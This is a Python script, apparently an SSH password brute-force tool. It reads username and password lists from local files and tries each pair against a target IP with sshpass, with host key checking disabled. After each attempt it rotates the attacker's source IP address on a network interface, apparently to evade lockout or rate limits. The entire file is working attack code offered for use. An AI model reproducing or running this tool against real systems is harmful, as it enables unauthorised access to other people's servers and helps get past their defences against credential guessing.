import subprocess

def set_Values():
    global target_IP
    target_IP = str(input("Please enter the Target IP"))
    global host_IP
    host_IP = str(input("Please enter the first 3 octets of the Source IP e.g. 0.0.0."))
    global network_Interface
    network_Interface = str(input("Please enter the Netork Interface"))

def make_IP_List():
    global ips
    ips = []
    for i in range(52, 254):
        ips.append(i)

def get_Passwords():
    global passwds
    passwds = []
    with open('./passwordfile.txt', 'r') as file1:
        passwds = [line.strip() for line in file1]

def get_Users():
    global users
    users = []
    with open('./userfile.txt', 'r') as file1:
        users = [line.strip() for line in file1]

def run_Attack():
    ip_index = 0
    passwd_index = 0
    while passwd_index < len(passwds):
        for user in users:
            for ps in passwds:
                print(user,':', ps)
                subprocess.call(['sshpass','-p', ps,'ssh','-o','stricthostkeychecking=no', user + '@' + target_IP])
                ip = ips[ip_index]
                old_ip = ip - 1
                subprocess.call(['sudo', 'ip', 'addr', 'add', host_IP + str(ip) + '/24', 'dev', network_Interface])
                subprocess.call(['sudo', 'ip', 'addr', 'delete', host_IP + str(old_ip) + '/24', 'dev', network_Interface])
                ip_index += 1
                if ip_index >= len(ips):
                    ip_index = 0
                passwd_index += 1
